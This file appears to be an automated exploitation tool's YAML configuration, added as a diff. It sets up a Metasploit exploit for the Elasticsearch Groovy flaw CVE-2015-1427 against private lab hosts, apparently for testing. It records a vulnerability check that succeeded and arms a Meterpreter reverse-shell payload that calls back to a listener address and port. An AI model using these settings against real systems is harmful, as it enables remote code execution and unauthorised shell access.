@@ -1,0 +1,791 @@
+schema: kalama.attack-form/v1
+run_id: AoFTs
+phase: before
+revision: 1
+base_resolver_sha256: 280370860c7df053aec82f39b1aef6c064cb946fe224d436617451eef675318c
+base_config_sha256: null
+cves:
+  CVE-2015-1427:
+    rank: 1
+    input_reasons:
+    - AMBIGUOUS_MODULE
+    - ENVIRONMENT_RPORT_REQUIRED
+    - EXECUTION_PROTOCOL_REQUIRED
+    - MODULE_OPTION_REQUIRED
+    - TARGETURI_REQUIRED
+    - TARGET_REQUIRED
+    module:
+      default: null
+      suggested: exploit/multi/elasticsearch/search_groovy_script
+      confirmed: exploit/multi/elasticsearch/search_groovy_script_compat
+      source: MODULE_RANKING
+      confirmation_status: SUGGESTED
+      required: true
+      candidates:
+      - rank_position: 1
+        score: 9
+        module_path: exploit/multi/elasticsearch/search_groovy_script
+        evidence:
+        - reason: metasploit_rank
+          weight: 6
+          matched: true
+          detail: excellent
+        - reason: check_supported
+          weight: 2
+          matched: true
+          detail: module advertises check() support
+        - reason: rport_target_match
+          weight: 0
+          matched: false
+          detail: module default 9200 matches only weak exposed metadata; no listening/reachable
+            runtime evidence
+        - reason: live_introspection
+          weight: 1
+          matched: true
+          detail: live module metadata available
+        module_source: stock
+      - rank_position: 1
+        score: 9
+        module_path: exploit/multi/elasticsearch/search_groovy_script_compat
+        evidence:
+        - reason: metasploit_rank
+          weight: 6
+          matched: true
+          detail: excellent
+        - reason: check_supported
+          weight: 2
+          matched: true
+          detail: module advertises check() support
+        - reason: rport_target_match
+          weight: 0
+          matched: false
+          detail: module default 9200 matches only weak exposed metadata; no listening/reachable
+            runtime evidence
+        - reason: live_introspection
+          weight: 1
+          matched: true
+          detail: live module metadata available
+        module_source: lab_fixture
+        fixture_source_path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\modules\exploits\multi\elasticsearch\search_groovy_script_compat.rb
+        fixture_sha256: 0989d37b8144722726d76dc116b845cdd7cd7a9ddcf990ece70024f643fdf01d
+        fixture_manifest:
+          container_fixture_module: /tmp/kalama-msf-fixtures-cve-2015-1427/modules/exploits/multi/elasticsearch/search_groovy_script_compat.rb
+          diff_path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\search_groovy_script_compat.diff
+          stock_copy_path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\stock\search_groovy_script.rb
+          container_fixture_root: /tmp/kalama-msf-fixtures-cve-2015-1427
+          original_module_path: /usr/src/metasploit-framework/modules/exploits/multi/elasticsearch/search_groovy_script.rb
+          fixture_module_fullname: exploit/multi/elasticsearch/search_groovy_script_compat
+          files:
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\adjusted-check-command.json
+            relative: adjusted-check-command.json
+            length: 620
+            sha256: 19d35210f0d5269f478da9623a257d0e27b755ffdab7121d9f487fa44b2cb126
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\adjusted-check-result.json
+            relative: adjusted-check-result.json
+            length: 630
+            sha256: 2b059cb46e62fffbafbe01c97aa97e2fdca56a81996015c0ce24810af1cff91e
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\fixture-probe-contract-test.log
+            relative: fixture-probe-contract-test.log
+            length: 147
+            sha256: b346b4bdcd6fd2e16e474c616bc1d944bb73d3680e745927fd006c6ca15d68c0
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\manifest.initial.json
+            relative: manifest.initial.json
+            length: 888
+            sha256: b53a76bdb0bd107ccf79b17cd70374a3adeaa5e605d036e9bc6b86037a1c22aa
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\manifest.json
+            relative: manifest.json
+            length: 1353
+            sha256: 56b3a9fa73b2cee99fdaa56731e84a5591521cb0109b7a2110d0c9e84ac4d1c9
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\metasploit-version.txt
+            relative: metasploit-version.txt
+            length: 44
+            sha256: c70f8dec1084cc4aafbf0d7cfd293b32edc7c32a4e2325a24c17721392763711
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\modules\exploits\multi\elasticsearch\search_groovy_script_compat.rb
+            relative: modules\exploits\multi\elasticsearch\search_groovy_script_compat.rb
+            length: 5981
+            sha256: 0989d37b8144722726d76dc116b845cdd7cd7a9ddcf990ece70024f643fdf01d
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\original-module-sha256.txt
+            relative: original-module-sha256.txt
+            length: 158
+            sha256: e74ed2ee51f01a8e29160ee7fc6dc72dbf7f88e8b39cc2fb8aefc57ecc184e6e
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\search_groovy_script_compat.diff
+            relative: search_groovy_script_compat.diff
+            length: 1260
+            sha256: c14f2c83fdc36a656f55bd5b8ca2302f8d1cf171d088934379f25d0f5a1b5d93
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\stock\search_groovy_script.rb
+            relative: stock\search_groovy_script.rb
+            length: 5977
+            sha256: d4ecc9744d16fd432f2ca42c6b7c3b9fc3e498aa6dfd974fb6bed26588a08ba3
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\syntax-check-container-file.json
+            relative: syntax-check-container-file.json
+            length: 253
+            sha256: ed0fca6037f9e8d71ec591fb5a5283555d4f5d88a39d9a52e72049b687a0cdbc
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\syntax-check-ruby-stdin.json
+            relative: syntax-check-ruby-stdin.json
+            length: 135
+            sha256: 782d0eacff4f37e14a49caef289b5b1daac8da50f95c2b575654cef6e8a01b31
+          - path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\test_fixture_probe_contract.py
+            relative: test_fixture_probe_contract.py
+            length: 1770
+            sha256: bd481ab4e949727a473aa0f3d915aa429b65775a39f9cb233155111e9653c5e4
+          validation:
+            syntax_stdin:
+              command: Get-Content fixture -Raw | docker exec -i msf-resolver-host
+                ruby -c
+              output: Syntax OK
+              exit_code: 0
+            adjusted_check_result:
+              exit_code: 0
+              stdout_stderr:
+              - 'Loaded 1 modules:'
+              - '    1 exploit modules'
+              - '[*] No payload configured, defaulting to java/meterpreter/reverse_tcp'
+              - TARGET => 0
+              - RHOSTS => 172.18.0.7
+              - RPORT => 9200
+              - TARGETURI => /
+              - DOMAIN => WORKSTATION
+              - HTTP::Auth => auto
+              - HTTP::KrbOfferedEncryptionTypes => AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1
+              - KrbCacheMode => read-write
+              - KrbClockSkew => 0.0
+              - SSLVersion => Auto
+              - '[+] 172.18.0.7:9200 - The target is vulnerable. Arbitrary Java execution
+                confirmed via Groovy scripting'
+            syntax_container_file:
+              command: ruby -c /tmp/kalama-msf-fixtures-cve-2015-1427/modules/exploits/multi/elasticsearch/search_groovy_script_compat.rb
+              output: Syntax OK
+              exit_code: 0
+              container_fixture_root: /tmp/kalama-msf-fixtures-cve-2015-1427
+            fixture_contract_log: "fixture probe contract tests passed: positive_expected_string,\
+              \ unexpected_string, missing_hits_0, old_class_serialization_failure,\
+              \ malformed_json\r\n"
+          fixture_path: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\modules\exploits\multi\elasticsearch\search_groovy_script_compat.rb
+          stock_copy_sha256: d4ecc9744d16fd432f2ca42c6b7c3b9fc3e498aa6dfd974fb6bed26588a08ba3
+          original_sha256: d4ecc9744d16fd432f2ca42c6b7c3b9fc3e498aa6dfd974fb6bed26588a08ba3
+          metasploit_version:
+          - 'Framework: 6.5.4-dev'
+          - 'Console  : 6.5.4-dev'
+          fixture_modules_root: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\modules
+          fixture_sha256: 0989d37b8144722726d76dc116b845cdd7cd7a9ddcf990ece70024f643fdf01d
+        fixture_modules_root: C:\Users\distortion\Documents\new-idea-kalama\lab-fixtures\metasploit\cve-2015-1427\modules
+        fixture_namespace: ad5fcff47013d8ce
+        loaded_module_path: /tmp/kalama-msf-lab-fixtures/ad5fcff47013d8ce/modules/exploits/multi/elasticsearch/search_groovy_script_compat.rb
+    target:
+      required: true
+      index:
+        default: 0
+        suggested: 0
+        confirmed: 0
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: true
+      name:
+        default: ElasticSearch 1.4.2
+        suggested: ElasticSearch 1.4.2
+        confirmed: ElasticSearch 1.4.2
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: true
+    targeturi:
+      default: /
+      suggested: /
+      confirmed: /
+      source: MODULE_DEFAULT
+      confirmation_status: SUGGESTED
+      required: true
+    module_options:
+      AllowNoCleanup:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      CertificateTrace:
+        default: 'off'
+        suggested: 'off'
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: enum
+      CertificateTraceColors:
+        default: red/blu
+        suggested: red/blu
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: string
+      ContextInformationFile:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: path
+      DigestAuthIIS:
+        default: true
+        suggested: true
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      DisablePayloadHandler:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      DOMAIN:
+        default: WORKSTATION
+        suggested: WORKSTATION
+        confirmed: WORKSTATION
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: true
+        type: string
+      DomainControllerRhost:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: address
+      EnableContextEncoding:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      FileDropperDelay:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: integer
+      FingerprintCheck:
+        default: true
+        suggested: true
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::Auth:
+        default: auto
+        suggested: auto
+        confirmed: auto
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: true
+        type: enum
+      HTTP::header_folding:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::Krb5Ccname:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: kerberos_credential_cache
+      HTTP::KrbOfferedEncryptionTypes:
+        default: AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1
+        suggested: AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1
+        confirmed: AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: true
+        type: string
+      HTTP::method_random_case:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::method_random_invalid:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::method_random_valid:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::pad_fake_headers:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::pad_fake_headers_count:
+        default: 0
+        suggested: 0
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: integer
+      HTTP::pad_get_params:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::pad_get_params_count:
+        default: 16
+        suggested: 16
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: integer
+      HTTP::pad_method_uri_count:
+        default: 1
+        suggested: 1
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: integer
+      HTTP::pad_method_uri_type:
+        default: space
+        suggested: space
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: enum
+      HTTP::pad_post_params:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::pad_post_params_count:
+        default: 16
+        suggested: 16
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: integer
+      HTTP::pad_uri_version_count:
+        default: 1
+        suggested: 1
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: integer
+      HTTP::pad_uri_version_type:
+        default: space
+        suggested: space
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: enum
+      HTTP::Rhostname:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: string
+      HTTP::shuffle_get_params:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::shuffle_post_params:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::uri_dir_fake_relative:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::uri_dir_self_reference:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::uri_encode_mode:
+        default: hex-normal
+        suggested: hex-normal
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: enum
+      HTTP::uri_fake_end:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::uri_fake_params_start:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::uri_full_url:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::uri_use_backslashes:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::version_random_invalid:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HTTP::version_random_valid:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HttpClientTimeout:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: float
+      HttpPassword:
+        default: ''
+        suggested: ''
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: string
+      HttpRawHeaders:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: path
+      HttpTrace:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HttpTraceColors:
+        default: red/blu
+        suggested: red/blu
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: string
+      HttpTraceHeadersOnly:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      HttpUsername:
+        default: ''
+        suggested: ''
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: string
+      KerberosTicketTrace:
+        default: 'off'
+        suggested: 'off'
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: enum
+      KerberosTicketTraceColors:
+        default: red/blu
+        suggested: red/blu
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: string
+      KrbCacheMode:
+        default: read-write
+        suggested: read-write
+        confirmed: read-write
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: true
+        type: enum
+      KrbClockSkew:
+        default: 0s
+        suggested: 0s
+        confirmed: 0s
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: true
+        type: timedelta
+      Proxies:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: proxies
+      SSL:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      SSLKeyLogFile:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: string
+      SSLServerNameIndication:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: string
+      SSLVersion:
+        default: Auto
+        suggested: Auto
+        confirmed: Auto
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: true
+        type: enum
+      UserAgent:
+        default: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15
+          (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15
+        suggested: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15
+          (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: string
+      VERBOSE:
+        default: false
+        suggested: false
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: bool
+      VHOST:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: string
+      WfsDelay:
+        default: 2
+        suggested: 2
+        confirmed: null
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: false
+        type: integer
+      WORKSPACE:
+        default: null
+        suggested: null
+        confirmed: null
+        source: UNSET
+        confirmation_status: UNRESOLVED
+        required: false
+        type: string
+    payload:
+      default: null
+      suggested: null
+      confirmed: java/meterpreter/reverse_tcp
+      source: UNSET
+      confirmation_status: UNRESOLVED
+      required: false
+      compatible:
+      - cmd/unix/bind_aws_instance_connect
+      - generic/custom
+      - generic/shell_bind_aws_ssm
+      - generic/shell_bind_tcp
+      - generic/shell_reverse_tcp
+      - generic/ssh/interact
+      - java/jsp_shell_bind_tcp
+      - java/jsp_shell_reverse_tcp
+      - java/meterpreter/bind_tcp
+      - java/meterpreter/reverse_http
+      - java/meterpreter/reverse_https
+      - java/meterpreter/reverse_tcp
+      - java/meterpreter_bind_tcp
+      - java/meterpreter_reverse_http
+      - java/meterpreter_reverse_https
+      - java/meterpreter_reverse_tcp
+      - java/shell/bind_tcp
+      - java/shell/reverse_tcp
+      - java/shell_reverse_tcp
+      - multi/meterpreter/reverse_http
+      - multi/meterpreter/reverse_https
+      compatibility_evidence:
+      - live_msfconsole
+      discovery_status: FOUND
+    payload_options:
+      LHOST:
+        confirmed: 172.18.0.3
+      LPORT:
+        confirmed: 4444
+      ReverseAllowProxy:
+        confirmed: false
+      ReverseListenerThreaded:
+        confirmed: false
+      PingbackRetries:
+        confirmed: 0
+      PingbackSleep:
+        confirmed: 30
+      PayloadUUIDTracking:
+        confirmed: false
+      Spawn:
+        confirmed: 2
+      AutoLoadStdapi:
+        confirmed: true
+      AutoSystemInfo:
+        confirmed: true
+      EnableUnicodeEncoding:
+        confirmed: false
+      AutoLoadExtensions:
+        confirmed:
+        - stdapi
+    preconditions:
+      description: Ensure Elasticsearch has a searchable document before the Groovy
+        probe/exploit.
+      commands:
+      - 'curl -fsS -XPOST -H ''Content-Type: application/json'' ''http://172.18.0.10:9200/kalama/doc/1''
+        -d ''{"field":"value"}'''
+      - curl -fsS -XPOST 'http://172.18.0.10:9200/kalama/_refresh'
+      execution_target: kalama-workbench
+      required: true
+      confirmation_status: HUMAN_CONFIRMED
+    pre_attack:
+      command: null
+      execution_target: null
+      confirmation_status: UNRESOLVED
+      required: false
+    execution_protocol:
+      check_supported: true
+      run_check: true
+      run_exploit: false
+      session_confirmation_expected: false
+      confirmation_status: SUGGESTED
+      mode: check-then-exploit
+      confirmed: true
+    environment:
+      rhosts:
+        default: null
+        suggested: 172.18.0.10
+        confirmed: 172.18.0.10
+        source: TARGET_FACT
+        confirmation_status: AUTO_CONFIRMED
+        required: true
+      rport:
+        default: null
+        suggested: 9200
+        confirmed: 9200
+        source: MODULE_DEFAULT
+        confirmation_status: SUGGESTED
+        required: true
+      lhost:
+        default: null
+        suggested: 172.18.0.3
+        confirmed: 172.18.0.3
+        source: TARGET_FACT
+        confirmation_status: SUGGESTED
+        required: false
+      binding_source: module_default
